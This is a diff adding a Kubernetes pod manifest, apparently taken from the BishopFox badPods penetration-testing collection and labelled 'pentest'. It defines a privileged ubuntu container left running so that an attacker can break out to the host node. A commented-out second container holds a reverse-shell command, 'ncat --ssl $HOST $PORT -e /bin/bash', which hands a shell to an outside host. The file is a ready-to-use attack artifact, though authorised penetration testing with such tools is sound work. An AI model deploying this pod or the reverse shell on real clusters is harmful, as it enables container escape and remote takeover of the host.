@@ -1,0 +1,22 @@
+# source: https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-privileged
+  labels:
+    app: pentest
+spec:
+  # you can specify the node: `kubectl get node -o jsonpath='{.items[*].metadata.name}'`
+  containers:
+  - name: main
+    image: ubuntu
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "sleep infinity" ]
+    securityContext:
+      privileged: true
+  # - name: priv-revshell-deployment
+  #   image: raesene/ncat
+  #   securityContext:
+  #     privileged: true
+  #   command: [ "/bin/sh", "-c", "--" ]
+  #   args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
